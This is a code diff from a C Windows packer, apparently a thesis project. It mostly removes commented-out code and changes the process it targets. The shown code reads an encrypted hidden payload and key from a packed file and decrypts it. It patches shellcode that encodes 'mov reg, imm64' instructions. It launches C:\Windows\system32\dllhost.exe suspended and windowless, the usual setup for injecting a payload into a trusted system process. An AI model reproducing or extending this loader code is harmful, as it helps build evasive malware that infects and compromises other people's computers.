@@ -292,11 +292,6 @@ uInt replaceAll_mov_reg_imm32(BYTE* targetMemoryAddress, DWORD textSize, HANDLE 
         int32_t rel1 = (int32_t)((shell + 21) - (shell + 7)); // [oldRsp] - (next RIP)
         *(int32_t*)(shell + 3) = rel1;
 
-        // MovEncoding enc = get_mov_imm64_opcodeFromReg(matches[idx].reg);
-        // if(enc.opcode == 0x10 && enc.rex_prefix == 0x10){
-        //     printf("[!] No opcode for register %s at address: 0x%p\n", matches[idx].registerName, addressMOVinstr);
-        //     continue;
-        // }
 
         // [7] mov reg, imm64
         if(enc.rex_prefix){
@@ -751,48 +746,6 @@ HiddenFile* findSection(char *fileName){
         return NULL;
     }
     fread(key+3, sizeof(key[0]), 1, packedFile);
-    //---------------------------
-
-    /*
-    // fseek(packedFile, addressOfFile + paddingForOutput, SEEK_SET);
-
-    // fread(key, sizeof(key[0]), 1, packedFile);
-
-    // fread(&originalFileSize, sizeof(DWORD), 1, packedFile);
-    // if(ferror(packedFile)){
-    //     printf("[FAIL] Read current file\n");
-    //     return NULL;
-    // }
-
-    // fread(key+1, sizeof(key[0]) * 3 , 1, packedFile);
-
-    // // fread(key, sizeof(key), 1, packedFile);
-    // if(ferror(packedFile)){
-    //     printf("[FAIL] Read current file\n");
-    //     return NULL;
-    // }
-
-    // printf("original file size:%x |key:%x\n", originalFileSize, key[0]);
-
-    // BYTE* packedFileContent = (BYTE*)malloc(sizeOfEncryptedSection);
-    // if(packedFileContent == NULL){
-    //     printf("[FAIL] Allocate memory for new file\n");
-    //     return NULL;
-    // }
-
-    // fread(packedFileContent + paddingForOutput, sizeOfCompressedSection - paddingForOutput, 1, packedFile);
-    // if(ferror(packedFile)){
-    //     printf("[FAIL] Read current file - last Section\n");
-    //     return NULL;
-    // }
-
-    // fseek(packedFile, addressOfFile, SEEK_SET);
-    // fread(packedFileContent, paddingForOutput, 1, packedFile);
-    // if(ferror(packedFile)){
-    //     printf("[FAIL] Read current file - last Section\n");
-    //     return NULL;
-    // }
-    */
     
     size_t decryptedSize = 0;
     BYTE* decryptedFileContent = decryptAll(packedFileContent, sizeOfEncryptedSection, key, decryptedSize);
@@ -908,14 +861,7 @@ bool starting(char *fileName){
     memset(&startupInfo, 0, sizeof(STARTUPINFO));
     memset(&processInfo, 0, sizeof(PROCESS_INFORMATION));
 
-    // if(!CreateProcessA(/*"D:\\Facultate\\Licenta\\packer\\hello.exe"*/"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &startupInfo, &processInfo)){
-    //     printf("[FAIL] Create process\n");
-    //     return false;
-    // }
-    // ResumeThread(processInfo.hThread);
-    // return true;
-
-    if(!CreateProcessA(/*"D:\\Facultate\\Licenta\\packer\\hello.exe"*/"C:\\Windows\\system32\\dllhost.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &startupInfo, &processInfo)){
+    if(!CreateProcessA("C:\\Windows\\system32\\dllhost.exe", NULL, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NO_WINDOW, NULL, NULL, &startupInfo, &processInfo)){
         printf("[FAIL] Create process\n");
         return false;
     }
